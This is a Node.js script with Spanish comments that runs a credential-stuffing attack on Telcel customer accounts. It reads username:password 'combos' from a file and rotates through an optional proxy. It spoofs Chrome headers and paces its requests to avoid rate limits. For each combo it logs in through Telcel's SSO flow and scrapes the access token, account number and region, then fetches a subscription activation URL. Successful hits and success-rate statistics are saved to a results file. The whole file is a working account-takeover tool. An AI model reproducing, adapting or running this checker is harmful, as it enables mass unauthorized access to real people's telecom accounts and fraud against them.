import axios from 'axios';
import { CookieJar } from 'tough-cookie';
import fs from 'fs/promises';
import { config } from 'dotenv';
import { HttpsProxyAgent, HttpProxyAgent } from 'hpagent';

config(); // Carga .env si existe

// ==============
// CONFIGURACIÓN
// =========================================
const CONFIG = {
  // Proxy: null para no usar proxy, o string con formato:
  // 'http://host:port' o 'http://user:pass@host:port'
  proxy: process.env.PROXY || null,
  
  // Archivos
  combosFile: './telcel_resultado.txt', // Formato: user:pass por línea
  resultsFile: './results.json',
  
  // Delays (ms) - IMPORTANTE para evitar rate limit
  delayBetweenCombos: 3000, // Entre cada combo
  delayBetweenRequests: 800, // Entre cada request del flujo
  
  // Timeout para requests
  requestTimeout: 30000,
};

// =========================================
// FUNCIONES DE UTILIDAD
// =========================================
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function extractValue(text, leftDelim, rightDelim) {
  const start = text.indexOf(leftDelim);
  if (start === -1) return null;
  const end = text.indexOf(rightDelim, start + leftDelim.length);
  if (end === -1) return null;
  return text.substring(start + leftDelim.length, end);
}

// =========================================
// CREAR CLIENTE HTTP CON PROXY
// =========================================
function createClient() {
  const jar = new CookieJar();
  const client = axios.create({
    timeout: CONFIG.requestTimeout,
    validateStatus: () => true,
  });

  if (CONFIG.proxy) {
    console.log(`🌐 Usando proxy: ${CONFIG.proxy.split('@').pop()}`);
    const proxyUrl = new URL(CONFIG.proxy);
    const Agent = proxyUrl.protocol === 'https:' ? HttpsProxyAgent : HttpProxyAgent;
    client.defaults.httpAgent = new Agent({ proxy: CONFIG.proxy });
    client.defaults.httpsAgent = new Agent({ proxy: CONFIG.proxy });
  }

  // Interceptor para manejar cookies manualmente
  client.interceptors.request.use(async (config) => {
    const url = config.url;
    const cookies = await jar.getCookieString(url);
    if (cookies) {
      config.headers.Cookie = cookies;
    }
    return config;
  });

  client.interceptors.response.use(async (response) => {
    const setCookie = response.headers['set-cookie'];
    if (setCookie) {
      for (const cookie of setCookie) {
        await jar.setCookie(cookie, response.config.url);
      }
    }
    return response;
  });

  return client;
}

// =========================================
// LEER COMBOS DESDE ARCHIVO
// =========================================
async function readCombos(filePath) {
  try {
    const content = await fs.readFile(filePath, 'utf8');
    const combos = content
      .split('\n')
      .map(line => line.trim())
      .filter(line => line && line.includes(':'))
      .map(line => {
        const [user, ...passParts] = line.split(':');
        return {
          user: user.trim(),
          password: passParts.join(':').trim() // Por si la password tiene ':'
        };
      });
    
    console.log(`📂 Se encontraron ${combos.length} combos en ${filePath}`);
    return combos;
  } catch (error) {
    throw new Error(`No se pudo leer el archivo de combos: ${error.message}`);
  }
}

// =========================================
// PROCESAR UN SOLO COMBO
// =========================================
async function processCombo(combo, index, total) {
  const client = createClient();
  const result = {
    success: false,
    user: combo.user,
    timestamp: new Date().toISOString(),
    data: {},
    error: null
  };

  try {
    console.log(`\n[${index}/${total}] 🔐 Procesando ${combo.user}...`);
    
    // === UTF8ToBase64 ===
    const passBase64 = Buffer.from(combo.password, 'utf8').toString('base64');
    await sleep(CONFIG.delayBetweenRequests);
    
    // === UrlEncode ===
    const passUrlEncoded = encodeURIComponent(passBase64);
    await sleep(CONFIG.delayBetweenRequests);
    
    // === HttpRequest (Login) ===
    console.log(`[${index}] 📡 Enviando credenciales...`);
    const loginResponse = await client.post(
      'https://wbl.telcel-id.com:8443/login',
      `username=${combo.user}&password=${combo.password}&sitedomain=https%3A%2F%2Fwww.mitelcel.com%2Fmitelcel&CCode=52&Type=MSISDN&Invocation=iFrame&MSISDN=&Source=&pB64=${passUrlEncoded}`,
      {
        headers: {
          'Host': 'wbl.telcel-id.com:8443',
          'Connection': 'keep-alive',
          'sec-ch-ua-platform': '"Windows"',
          'sec-ch-ua': '"Not;A=Brand";v="99", "Chrome";v="139"',
          'uzlc': 'true',
          'sec-ch-ua-mobile': '?0',
          'X-Requested-With': 'XMLHttpRequest',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
          'Accept': '*/*',
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Sec-GPC': '1',
          'Accept-Language': 'es-419,es;q=0.7',
          'Origin': 'https://wbl.telcel-id.com:8443',
          'Sec-Fetch-Site': 'same-origin',
          'Sec-Fetch-Mode': 'cors',
          'Sec-Fetch-Dest': 'empty',
          'Accept-Encoding': 'gzip, deflate'
        },
        maxRedirects: 0
      }
    );
    await sleep(CONFIG.delayBetweenRequests);
    
    // === HttpRequest (Follow Redirect) ===
    const redirectUrl = loginResponse.headers.location;
    if (!redirectUrl) {
      throw new Error('No se encontró URL de redirección');
    }
    
    console.log(`[${index}] 🔗 Siguiendo redirección...`);
    const redirectResponse = await client.get(redirectUrl, {
      headers: {
        'Host': 'wbl.telcel-id.com:8443',
        'Connection': 'keep-alive',
        'sec-ch-ua-platform': '"Windows"',
        'sec-ch-ua': '"Not;A=Brand";v="99", "Chrome";v="139"',
        'uzlc': 'true',
        'sec-ch-ua-mobile': '?0',
        'X-Requested-With': 'XMLHttpRequest',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'Accept': '*/*',
        'Sec-GPC': '1',
        'Accept-Language': 'es-419,es;q=0.7',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Accept-Encoding': 'gzip, deflate',
        'Cookie': `MSISDN=${combo.user}`
      }
    });
    await sleep(CONFIG.delayBetweenRequests);
    
    // === Keycheck & Parse (accessToken) ===
    const source1 = loginResponse.data;
    let accessToken = null;
    
    if (source1.includes('La contraseña es incorrecta') || source1.includes('"estatus":"error"')) {
      throw new Error('Credenciales incorrectas');
    }
    
    if (source1.includes('"token":"') || source1.includes('Se obtuvo el token')) {
      accessToken = extractValue(source1, '"token":"', '"');
      console.log(`[${index}] ✅ Token obtenido: ${accessToken.substring(0, 20)}...`);
    } else if (source1.includes('403 Forbidden')) {
      throw new Error('Retry - 403 Forbidden');
    } else {
      throw new Error('No se pudo obtener el token');
    }
    
    // === HttpRequest (SSO Login) ===
    console.log(`[${index}] 📡 Iniciando SSO...`);
    const ssoResponse = await client.post(
      'https://www.mitelcel.com/mitelcel/sso/login',
      `accessToken=${accessToken}&fromTelcel=&gotoFromBanner=&goto=opcional`,
      {
        headers: {
          'Host': 'www.mitelcel.com',
          'Connection': 'keep-alive',
          'Cache-Control': 'max-age=0',
          'sec-ch-ua': '"Not;A=Brand";v="99", "Chrome";v="139"',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '"Windows"',
          'Origin': 'https://www.mitelcel.com',
          'Content-Type': 'application/x-www-form-urlencoded',
          'Upgrade-Insecure-Requests': '1',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
          'Sec-GPC': '1',
          'Accept-Language': 'es-419,es;q=0.7',
          'Sec-Fetch-Site': 'same-origin',
          'Sec-Fetch-Mode': 'navigate',
          'Sec-Fetch-User': '?1',
          'Sec-Fetch-Dest': 'document',
          'Referer': 'https://www.mitelcel.com/mitelcel/login',
          'Accept-Encoding': 'gzip, deflate'
        },
        maxRedirects: 0
      }
    );
    await sleep(CONFIG.delayBetweenRequests);
    
    // === HttpRequest (Auth) ===
    console.log(`[${index}] 📡 Autenticando...`);
    const authResponse = await client.post(
      'https://www.mitelcel.com/mitelcel/login/auth',
      `isTablet=false&j_username=${accessToken}&j_password=&goto=opcional&fromTelcel=&origen=ssoWeblogin&mantenimientoActivo=false`,
      {
        headers: {
          'Host': 'www.mitelcel.com',
          'Connection': 'keep-alive',
          'Cache-Control': 'max-age=0',
          'sec-ch-ua': '"Not;A=Brand";v="99", "Chrome";v="139"',
          'sec-ch-ua-mobile': '?0',
          'sec-ch-ua-platform': '"Windows"',
          'Origin': 'https://www.mitelcel.com',
          'Content-Type': 'application/x-www-form-urlencoded',
          'Upgrade-Insecure-Requests': '1',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
          'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
          'Sec-GPC': '1',
          'Accept-Language': 'es-419,es;q=0.7',
          'Sec-Fetch-Site': 'same-origin',
          'Sec-Fetch-Mode': 'navigate',
          'Sec-Fetch-Dest': 'document',
          'Referer': 'https://www.mitelcel.com/mitelcel/sso/login',
          'Accept-Encoding': 'gzip, deflate'
        },
        maxRedirects: 0
      }
    );
    await sleep(CONFIG.delayBetweenRequests);
    
    // === HttpRequest (Inicio) ===
    console.log(`[${index}] 📡 Accediendo al inicio...`);
    const inicioResponse = await client.get('https://www.mitelcel.com/mitelcel/inicio', {
      headers: {
        'Host': 'www.mitelcel.com',
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Sec-GPC': '1',
        'Accept-Language': 'es-419,es;q=0.7',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Dest': 'document',
        'sec-ch-ua': '"Not;A=Brand";v="99", "Chrome";v="139"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'Referer': 'https://www.mitelcel.com/mitelcel/sso/login',
        'Accept-Encoding': 'gzip, deflate'
      }
    });
    
    const inicioSource = inicioResponse.data;
    const region = extractValue(inicioSource, 'region: "', '"');
    const accountNumber = extractValue(inicioSource, 'accountNumber = "', '"');
    console.log(`[${index}] 📊 Datos extraídos - Región: ${region}, Cuenta: ${accountNumber}`);
    await sleep(CONFIG.delayBetweenRequests);
    
    // === HttpRequest (Suscripciones) ===
    console.log(`[${index}] 📡 Obteniendo suscripciones...`);
    const subsResponse = await client.get('https://www.mitelcel.com/mitelcel/servicios-suscripciones/suscripciones-activas', {
      headers: {
        'Host': 'www.mitelcel.com',
        'Connection': 'keep-alive',
        'sec-ch-ua': '"Not;A=Brand";v="99", "Chrome";v="139"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Sec-GPC': '1',
        'Accept-Language': 'es-419,es;q=0.7',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Sec-Fetch-Dest': 'document',
        'Accept-Encoding': 'gzip, deflate'
      }
    });
    
    const subsSource = subsResponse.data;
    const step = extractValue(subsSource, 'gestionOtts.step="', '"');
    const rate = extractValue(subsSource, 'gestionOtts.rate="', '"');
    console.log(`[${index}] 📊 Parámetros OTT - Step: ${step}, Rate: ${rate}`);
    await sleep(CONFIG.delayBetweenRequests);
    
    // === HttpRequest (URL Gestion) ===
    console.log(`[${index}] 📡 Obteniendo URL de gestión...`);
    const gestionResponse = await client.get(
      `https://www.telcel.com/bin/telcelcom/gestionamiento/otts.urlGestion.json?userId=${accountNumber}&productId=AM60P&step=${step}&canal=&rate=${rate}`,
      {
        headers: {
          'Host': 'www.telcel.com',
          'Connection': 'keep-alive',
          'sec-ch-ua-platform': '"Windows"',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
          'Accept': '*/*',
          'sec-ch-ua': '"Not;A=Brand";v="99", "Chrome";v="139"',
          'sec-ch-ua-mobile': '?0',
          'Sec-GPC': '1',
          'Accept-Language': 'es-419,es;q=0.7',
          'Origin': 'https://www.mitelcel.com',
          'Sec-Fetch-Site': 'cross-site',
          'Sec-Fetch-Mode': 'cors',
          'Sec-Fetch-Dest': 'empty',
          'Referer': 'https://www.mitelcel.com/',
          'Accept-Encoding': 'gzip, deflate'
        }
      }
    );
    
    const gestionSource = gestionResponse.data;
    const urlActivation = extractValue(gestionSource, 'value": "', '"');
    console.log(`[${index}] 🎯 URL de activación: ${urlActivation}`);
    
    // === Keycheck Final ===
    if (!urlActivation) {
      throw new Error('No se encontró urlActivation');
    }
    
    if (!urlActivation.includes('https://a.smapps.mx/')) {
      throw new Error('La URL de activación no contiene el dominio esperado');
    }
    
    if (gestionSource.includes("You don't have permission to access")) {
      throw new Error('Retry - Permiso denegado');
    }
    
    console.log(`[${index}] ✅ Flujo completado exitosamente!`);
    
    result.success = true;
    result.data = {
      accessToken,
      accountNumber,
      region,
      urlActivation
    };
    
    return result;
    
  } catch (error) {
    console.error(`[${index}] ❌ Error: ${error.message}`);
    result.error = error.message;
    result.success = false;
    return result;
  }
}

// =========================================
// FUNCIÓN PRINCIPAL
// =========================================
async function main() {
  console.log('🚀 Iniciando proceso masivo de Telcel...\n');
  
  // Validar si usa proxy
  if (CONFIG.proxy) {
    console.log(`🌐 Proxy activado: ${CONFIG.proxy.split('@')[1] || CONFIG.proxy}`);
  } else {
    console.log('🌐 Sin proxy (usando IP local)');
  }
  
  try {
    // Leer combos
    const combos = await readCombos(CONFIG.combosFile);
    
    if (combos.length === 0) {
      throw new Error('No se encontraron combos válidos en el archivo');
    }
    
    // Procesar cada combo
    const results = [];
    const total = combos.length;
    
    for (let i = 0; i < total; i++) {
      const combo = combos[i];
      const result = await processCombo(combo, i + 1, total);
      results.push(result);
      
      // Delay entre combos (si no es el último)
      if (i < total - 1) {
        const waitTime = CONFIG.delayBetweenCombos;
        console.log(`\n⏳ Esperando ${waitTime}ms antes del siguiente combo...`);
        await sleep(waitTime);
      }
    }
    
    // Guardar resultados
    await fs.writeFile(CONFIG.resultsFile, JSON.stringify(results, null, 2));
    console.log(`\n📋 Resultados guardados en: ${CONFIG.resultsFile}`);
    
    // Estadísticas
    const successCount = results.filter(r => r.success).length;
    const failCount = results.filter(r => !r.success).length;
    
    console.log('\n📊 ESTADÍSTICAS FINALES:');
    console.log(`✅ Exitosos: ${successCount}/${total}`);
    console.log(`❌ Fallidos: ${failCount}/${total}`);
    console.log(`🎯 Tasa de éxito: ${((successCount/total)*100).toFixed(1)}%`);
    
  } catch (error) {
    console.error(`\n❌ Error fatal: ${error.message}`);
    process.exit(1);
  }
}

// =========================================
// EJECUTAR
// =========================================
main();